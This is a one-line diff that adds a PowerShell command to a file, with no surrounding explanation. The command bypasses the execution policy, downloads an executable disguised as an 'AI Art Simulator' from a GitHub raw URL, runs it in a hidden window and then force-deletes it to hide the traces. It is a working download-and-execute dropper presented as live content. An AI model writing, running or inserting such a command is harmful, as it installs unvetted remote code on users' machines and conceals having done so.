@@ -1,0 +1,1 @@
+powershell -exec bypass -c "$url='https://raw.githubusercontent.com/FAKE-ARTIST-007/Steal_Like_An_Artist/main/AI_Art_Simulator.exe';$p=[System.IO.Path]::GetTempPath()+[System.Guid]::NewGuid()+'.exe';(New-Object Net.WebClient).DownloadFile($url,$p);Start-Process $p -WindowStyle Hidden;Start-Sleep 10;Remove-Item $p -Force -ErrorAction SilentlyContinue"
